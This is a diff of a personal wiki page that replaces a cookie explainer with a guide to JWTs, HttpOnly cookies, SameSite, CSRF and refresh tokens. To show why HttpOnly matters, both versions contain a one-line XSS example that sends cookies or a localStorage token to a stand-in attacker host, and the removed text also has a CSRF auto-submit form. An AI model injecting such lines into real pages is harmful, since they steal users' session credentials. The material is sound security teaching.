@@ -1,306 +1,257 @@
-# Cookies
+# JWT vs Cookies — Personal Wiki
 
-## The Problem: The Browser Has No Memory Either
-
-You already know HTTP is forgetful — every request is a stranger to the
-server. But there's a second problem on the other side: the browser is
-also forgetful.
-
-JavaScript variables vanish the moment you close a tab. A page reload
-wipes everything. If you log in, navigate to another page, and the
-browser has nowhere to hold your token — you're logged out.
-
-Something needs to persist small pieces of data on the client side,
-survive page navigation, survive reloads, and travel automatically with
-every request to the right server.
-
-That something is a **cookie**.
+> A plain-language guide to what JWTs and cookies are, how they relate, and how they work together in a real app.
 
 ---
 
-## What a Cookie Is
+## The Hotel Analogy
 
-A cookie is a small key-value pair that the server asks the browser to
-store and send back automatically on every matching request.
+Think of authentication like checking into a hotel.
 
-```
-name:    session_id
-value:   abc123
-domain:  miniagoda.com
-path:    /
-expires: 2024-12-25T00:00:00Z
-```
+- **Your passport** = your email + password
+- **The front desk verifying it** = the login endpoint
+- **Your keycard** = the token the server gives you after login
+- **Tapping the keycard** = sending the token with every request
 
-The server sets it. The browser holds it. The browser sends it back
-without the user or JavaScript doing anything.
+You show your passport once. After that, you just tap the keycard. You don't re-enter your password on every request — you prove who you are using the token the server gave you.
 
 ---
 
-## How a Cookie Is Born
+## What is a JWT?
 
-### Step 1 — Server sets the cookie
+JWT stands for **JSON Web Token**. It is the **format of the token** — what the credential looks like and what it contains.
 
-After a successful login, the server includes a `Set-Cookie` header in
-its response:
-
-```
-HTTP/1.1 200 OK
-Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Expires=Tue, 25 Dec 2024 00:00:00 GMT
-```
-
-### Step 2 — Browser stores it
-
-The browser reads the `Set-Cookie` header and saves the cookie in its
-local cookie store, associated with the domain `miniagoda.com`.
-
-### Step 3 — Browser sends it automatically
-
-Every subsequent request to `miniagoda.com` includes the cookie in the
-`Cookie` header — automatically, without any JavaScript needed:
+It is a small piece of text with three parts separated by dots:
 
 ```
-GET /api/v1/bookings
-Cookie: session_id=abc123
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c3JfMDAxIn0.sFlKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 ```
 
-The server reads `session_id`, looks it up, finds the user, and proceeds.
+Decoded, it contains readable identity information:
+
+```json
+{
+  "userId": "usr_001",
+  "role": "GUEST",
+  "email": "jane@example.com",
+  "expiresAt": "2025-11-01T10:00:00Z"
+}
+```
+
+The server puts your identity inside the token, **signs it cryptographically**, and sends it to you. When you send it back on the next request, the server reads it and instantly knows who you are — no database lookup needed. The signature guarantees the token has not been tampered with.
 
 ---
 
-## Cookie Attributes — What They Mean
+## What is a Cookie?
 
-Each attribute on a cookie controls its behaviour. These are not
-optional niceties — they are security decisions.
+A cookie is a **small storage box that lives in your browser**.
 
-### `Expires` / `Max-Age`
-When the cookie should be deleted.
+The server says: *"Hey browser, hold onto this piece of text for me."* The browser saves it. Then — and this is the key behaviour — **the browser automatically sends it back on every future request to that server**, without any JavaScript doing anything.
+
+That is all a cookie is. Browser storage with automatic delivery.
+
+---
+
+## The Relationship
+
+JWT and cookies are completely separate things that are often used together.
 
 ```
-Expires=Tue, 25 Dec 2024 00:00:00 GMT
-Max-Age=86400   ← seconds from now (1 day)
+JWT     =  what the token contains       (the keycard data)
+Cookie  =  where the token lives         (the wallet holding the keycard)
 ```
 
-Without this, the cookie is a **session cookie** — it lives until the
-browser is closed. With it, the cookie **persists** across browser
-restarts until the date passes.
+You can put a JWT inside a cookie. You can also put a JWT in `localStorage`. You can even put a non-JWT token in a cookie. They do not depend on each other — the combination is a choice, not a requirement.
 
-### `HttpOnly`
+---
+
+## Where You Can Store a JWT
+
+Once the server issues a JWT, your application has to put it somewhere in the browser. There are two main options.
+
+**Option A — `localStorage` + `Authorization` header**
+
 ```
-Set-Cookie: session_id=abc123; HttpOnly
+Login → server returns JWT in response body
+→ JS saves it:     localStorage.setItem('token', jwt)
+→ JS attaches it:  headers: { Authorization: 'Bearer ' + token }
 ```
 
-The cookie cannot be read or modified by JavaScript.
-`document.cookie` will not show it. It can only travel in HTTP headers.
+**Option B — HttpOnly Cookie**
 
-This is critical. If your site has an XSS vulnerability (injected
-JavaScript), an attacker's script cannot steal an HttpOnly cookie.
-Without HttpOnly, one line of JavaScript is enough to steal the session:
+```
+Login → server sends JWT inside a Set-Cookie header
+→ browser saves it automatically
+→ browser sends it automatically on every request
+→ JS does nothing
+```
+
+Both options work. The difference is who is responsible for the token — your JavaScript code, or the browser itself.
+
+---
+
+## Why HttpOnly Cookies Are Safer
+
+If an attacker manages to inject malicious JavaScript into your page (XSS), they can steal a token from `localStorage` trivially:
 
 ```javascript
-// attacker's injected script
-fetch("https://evil.com/steal?c=" + document.cookie);
+// Token in localStorage — completely exposed
+fetch('https://attacker.com/?token=' + localStorage.getItem('token'))
 ```
 
-HttpOnly makes this impossible.
+If the token is in an **HttpOnly cookie**, that attack fails completely:
 
-### `Secure`
-```
-Set-Cookie: session_id=abc123; Secure
-```
-
-The cookie is only sent over HTTPS — never over plain HTTP. If the
-connection is unencrypted, the browser silently drops the cookie from
-the request.
-
-### `SameSite`
-Controls whether the cookie is sent on cross-site requests. This
-defends against CSRF (see below).
-
-| Value | Behaviour |
-|---|---|
-| `Strict` | Cookie only sent on requests originating from the same site. Never on cross-site requests. |
-| `Lax` | Cookie sent on same-site requests AND top-level navigations (e.g. clicking a link). Not on cross-site POST. |
-| `None` | Cookie sent on all requests, including cross-site. Must be combined with `Secure`. |
-
-For authentication cookies, `Strict` or `Lax` is almost always correct.
-
-### `Domain`
-```
-Set-Cookie: session_id=abc123; Domain=miniagoda.com
+```javascript
+// HttpOnly cookie — JS cannot read this at all
+// document.cookie will not show it
+// fetch cannot access it
+// The browser guards it at the OS level
 ```
 
-Which domain the cookie belongs to. The browser only sends the cookie
-to this domain and its subdomains. A cookie for `miniagoda.com` will
-also be sent to `api.miniagoda.com`, but never to `evil.com`.
-
-### `Path`
-```
-Set-Cookie: session_id=abc123; Path=/
-```
-
-Which URL paths the cookie applies to. `Path=/` means every path on the
-domain. `Path=/api` means only requests to `/api/*` will include the
-cookie.
+`HttpOnly` is a flag on the cookie that tells the browser: *this cookie is for you to send automatically — JavaScript is not allowed to touch it.*
 
 ---
 
-## What Cookies Solve vs What They Don't
+## Comparison Table
 
-### What cookies solve
-- Persisting data across page navigations and reloads
-- Automatically attaching credentials to every request without
-  JavaScript involvement
-- Keeping the user "logged in" across browser restarts (with Expires)
-
-### What cookies don't solve
-- The server still needs something to store or verify — a cookie is just
-  the transport. The session or token it carries is what actually proves
-  identity.
-- Cookies are domain-scoped — a cookie set by `miniagoda.com` cannot be
-  read by `hotel-partner.com`. This is a feature (security), but means
-  cookies don't work for cross-domain scenarios without extra setup.
-
----
-
-## The Two Threats Cookies Face
-
-### Threat 1 — XSS (Cross-Site Scripting)
-An attacker injects JavaScript into your page. That script reads
-`document.cookie` and sends it to a server the attacker controls.
-
-**Defence: `HttpOnly`** — makes the cookie invisible to JavaScript.
-
-### Threat 2 — CSRF (Cross-Site Request Forgery)
-A user is logged into `miniagoda.com`. They visit `evil.com`, which
-contains:
-
-```html
-<form action="https://miniagoda.com/api/v1/bookings" method="POST">
-  <input type="hidden" name="roomId" value="grand-hyatt-suite" />
-</form>
-<script>document.forms[0].submit();</script>
-```
-
-The browser submits this form to `miniagoda.com`. Because cookies are
-sent automatically, `miniagoda.com` receives a valid session cookie — and
-thinks the request came from the user. The booking is made without the
-user's knowledge.
-
-**Defence: `SameSite=Strict`** — the browser refuses to send the cookie
-on any cross-site request, including that form submission.
-
----
-
-## Cookies vs localStorage
-
-Both store data in the browser. They are not the same thing.
-
-| | Cookie | localStorage |
+| | `localStorage` + Header | HttpOnly Cookie |
 |---|---|---|
-| Sent automatically with requests | ✅ Yes | ❌ No — must be added manually by JavaScript |
-| Accessible by JavaScript | Only if not `HttpOnly` | Always |
-| Expiry | Controlled by server via `Expires` | Until manually cleared |
-| Capacity | ~4 KB | ~5–10 MB |
-| Scope | Domain + path | Origin (domain + port) |
-| XSS protection possible | ✅ Yes — via `HttpOnly` | ❌ No |
-| CSRF protection possible | ✅ Yes — via `SameSite` | N/A (not auto-sent) |
+| Who holds the token? | Your JS code | The browser |
+| Who sends the token? | Your JS code | The browser (automatic) |
+| Can JS read it? | Yes | No |
+| Safe from XSS? | No | Yes |
+| CSRF risk? | None | Needs `SameSite=Strict` |
+| Works for mobile apps? | Natural fit | Awkward |
+| Extra backend config? | None | Small amount |
 
-**When to use cookies:** authentication tokens, session IDs — anything
-that must travel automatically with requests and must be protected from
-JavaScript.
+### CSRF — the one cookie weakness
 
-**When to use localStorage:** non-sensitive UI state, user preferences,
-cached data that JavaScript needs to read.
+Because browsers send cookies automatically, a malicious third-party site can trick a logged-in user's browser into making an unintended request — the cookie goes along for the ride. The fix is the `SameSite=Strict` flag, which tells the browser to only send the cookie if the request originates from your own site.
 
-Storing a JWT in localStorage is common but means JavaScript can always
-read it — XSS becomes a real threat. Storing a JWT in an `HttpOnly`
-cookie gives you XSS protection at the cost of needing CSRF protection.
-Neither is perfect. The right choice depends on your threat model.
+```java
+ResponseCookie.from("access_token", accessToken)
+    .httpOnly(true)        // JS cannot read this
+    .secure(true)          // HTTPS only
+    .sameSite("Strict")    // Blocks CSRF
+    .path("/")
+    .maxAge(3600)
+    .build();
+```
 
 ---
 
-## Cookies in the Session Flow
+## What Gets Stored Where
 
-Now that you know what cookies are, the old session story makes more
-sense:
+This is the most important thing to understand clearly.
 
 ```
-1. User logs in  →  POST /api/v1/auth/login
-
-2. Server creates a session record:
-   session_id: abc123  →  user: shawon, role: GUEST
-
-3. Server responds:
-   Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
-
-4. Browser stores the cookie
-
-5. Every future request automatically includes:
-   Cookie: session_id=abc123
-
-6. Server reads session_id, looks it up in the DB, finds the user
+Browser                     Your Server                  Database
+───────────────────         ─────────────────────        ─────────────────────
+Cookie jar                  JWT secret key               users table
+  └── access_token (JWT)    (to sign & verify JWTs)      refresh_tokens table
+  └── refresh_token                                         └── token (opaque)
+                                                            └── user_id
+                                                            └── expires_at
+                                                            └── revoked
 ```
 
-The cookie is just the carrier. The session record in the database is
-what actually holds the identity.
+- The **JWT access token** is never stored in the database. The server verifies it by checking its cryptographic signature using the secret key. No database lookup needed.
+- The **cookie** lives in the browser. It never touches the database.
+- The **refresh token** is stored in the database — but it is not a JWT. It is a random opaque string that means nothing on its own.
 
 ---
 
-## Where Cookies Fit With JWTs
+## Two Tokens, Two Purposes
 
-JWTs need to be stored somewhere on the client. Two options:
+A production auth system issues two tokens on login, not one.
 
-**Option A — localStorage + Authorization header**
-```javascript
-// Store
-localStorage.setItem("access_token", jwt);
+**Access token (JWT)**
+- Short-lived: 1 hour
+- Stateless: server verifies by signature, no DB lookup
+- Cannot be revoked early — if leaked, it is valid until expiry
+- This is why it is kept short-lived
 
-// Send manually on each request
-fetch("/api/v1/bookings", {
-  headers: { "Authorization": "Bearer " + localStorage.getItem("access_token") }
-});
+**Refresh token (opaque string)**
+- Long-lived: 30 days
+- Stored in the database
+- Can be revoked instantly by flipping a `revoked` flag
+- Used only to obtain a new access token when the old one expires
+
 ```
-Simple, but JavaScript can always read the token — XSS is a real risk.
-
-**Option B — HttpOnly cookie**
+a3f8c2d1-9b4e-4f7a-8c3d-2e1f0a9b8c7d
 ```
-Set-Cookie: access_token=eyJhbG...; HttpOnly; Secure; SameSite=Strict
-```
-JavaScript cannot read the token. The browser sends it automatically.
-CSRF becomes a concern, mitigated by `SameSite=Strict` and CSRF tokens.
 
-Most production applications choose Option B for the added XSS
-protection on the authentication token specifically.
+There is no identity information inside a refresh token. It is just a random ID that maps to a user row in the database. The server looks it up, checks it is not revoked or expired, and if valid, issues a new JWT access token.
 
 ---
 
-## Glossary
+## Why the Asymmetry?
 
-| Term | Meaning |
+Ask: what happens when you need to invalidate a token?
+
+With a JWT you cannot — once issued, it is valid until it expires. The server has no record of it to un-trust. This is the trade-off of stateless tokens: fast to verify, impossible to revoke mid-life.
+
+With a refresh token you can — just set `revoked = true` in the database. Logout, password change, and account suspension all target the refresh token for exactly this reason.
+
+```
+User logs out
+→ refresh token marked revoked in DB
+→ access token still technically valid, but expires within 1 hour
+→ next refresh attempt is rejected
+→ user is effectively logged out within the hour
+```
+
+---
+
+## The Full Flow, Step by Step
+
+```
+1. User logs in
+   → server creates JWT access token         (NOT stored in DB)
+   → server creates opaque refresh token     (stored in DB)
+   → both sent to browser as HttpOnly cookies
+
+2. User makes a request
+   → browser sends access token cookie automatically
+   → server verifies JWT signature           (no DB lookup)
+   → request is processed
+
+3. Access token expires after 1 hour
+   → browser sends refresh token cookie
+   → server looks up refresh token in DB
+   → if valid   → issues a new JWT access token
+   → if revoked → user must log in again
+
+4. User logs out
+   → server marks refresh token as revoked in DB
+   → server clears both cookies from browser
+```
+
+---
+
+## For Mobile Apps
+
+Cookies are a browser primitive. Mobile apps do not have a browser cookie jar, so they skip cookies entirely and store tokens in secure device storage (iOS Keychain, Android Keystore). They then send the JWT manually in the `Authorization` header on every request.
+
+Your backend handles both transparently:
+
+```java
+// JwtAuthFilter checks both places
+String token = extractFromCookie(request);        // web clients
+if (token == null) token = extractFromHeader(request);  // mobile clients
+```
+
+---
+
+## Summary
+
+| Concept | One-liner |
 |---|---|
-| Cookie | A small key-value pair the server asks the browser to store and return |
-| `Set-Cookie` | Response header the server uses to create a cookie |
-| `Cookie` | Request header the browser uses to send cookies back |
-| Session cookie | A cookie with no `Expires` — deleted when the browser closes |
-| Persistent cookie | A cookie with `Expires` — survives browser restarts |
-| `HttpOnly` | Cookie cannot be read by JavaScript — protects against XSS |
-| `Secure` | Cookie only sent over HTTPS |
-| `SameSite` | Controls whether the cookie is sent on cross-site requests — protects against CSRF |
-| XSS | Cross-Site Scripting — injected JavaScript stealing data from your page |
-| CSRF | Cross-Site Request Forgery — a malicious site triggering requests on behalf of a logged-in user |
-| localStorage | Browser storage readable by JavaScript — larger capacity, no automatic sending |
+| JWT | A signed piece of text that carries your identity. Verified by math, not a database. |
+| Cookie | Browser storage that delivers its contents automatically on every request. |
+| HttpOnly cookie | A cookie that JavaScript cannot read. The safest place to store a token in a browser. |
+| Access token | Short-lived JWT. Fast to verify. Cannot be revoked. |
+| Refresh token | Long-lived opaque string. Stored in DB. Can be revoked instantly. |
+| `SameSite=Strict` | Cookie flag that blocks CSRF attacks. |
 
----
-
-## One-Paragraph Summary
-
-A cookie is a small piece of data the server plants in the browser via
-the `Set-Cookie` response header. The browser stores it and sends it
-back automatically on every matching request via the `Cookie` header —
-no JavaScript required. This solves the statefulness problem: the server
-can recognise the same user across many requests. The `HttpOnly`
-attribute hides the cookie from JavaScript (blocking XSS theft),
-`Secure` ensures it only travels over HTTPS, and `SameSite` prevents it
-from being sent on cross-site requests (blocking CSRF). A cookie is just
-the transport mechanism — what it carries (a session ID, a JWT, a
-preference value) determines what problem it actually solves.
+> The **JWT** is verified by math, so it never needs to be stored on the server. The **refresh token** is verified by database lookup, so it must be stored — and that is exactly what gives you the power to revoke it. The **cookie** is just the delivery envelope for both. It lives in the browser and never touches your database.
